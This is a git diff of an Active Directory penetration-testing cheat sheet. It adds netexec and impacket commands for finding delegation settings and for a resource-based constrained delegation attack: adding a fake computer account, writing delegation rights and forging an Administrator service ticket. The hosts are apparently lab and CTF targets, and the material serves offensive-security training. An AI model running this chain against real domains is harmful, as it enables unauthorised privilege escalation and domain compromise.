@@ -159,6 +159,34 @@ impacket-lookupsid -k -no-pass -target-ip 10.10.11.75 dc.rustykey.htb
 netexec ldap MACHINE_IP -u pentest -p 'p3nt3st2025!&' -M pre2k
 ```
 
+---
+
+## 18. Delegation
+```powershell
+
+```
+nxc ldap dc.sendai.vl -u user -p pass --trusted-for-delegation
+nxc ldap dc.sendai.vl -u user -p pass --find-delegation
+
+impacket-findDelegation sendai.vl/user:pass
+---
+
+## 18. RBCD
+```powershell
+nxc ldap dc.sendai.vl -u user -p pass -M maq
+
+impacket-addcomputer sendai.vl/user:pass \
+  -computer-name 'FAKE$' -computer-pass 'Pass123!'
+
+impacket-rbcd sendai.vl/user:pass \
+  -action write -delegate-to TARGET$ \
+  -delegate-from FAKE$
+
+impacket-getST -spn cifs/TARGET.sendai.vl \
+  -impersonate Administrator \
+  sendai.vl/FAKE$:Pass123!
+```
+
 ## 18. NTLM Relaying
 
 Reference: [NTLM Relay Attack](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/NTLM%20Attacks.md)
@@ -246,12 +274,6 @@ Reference: [Windows Privilege Escalation](https://github.com/Aghalarovf/Penetrat
 ## 27. GPO Abuse
 
 Reference: [GPO Abuse tactics](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/GPO%20Attacks.md)
-
----
-
-## 28. Delegation Attacks
-
-Reference: [RBCD, Unconstrained and Constrained Delegation Attacks](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Delegation-Abuse.md)
 
 ---
 
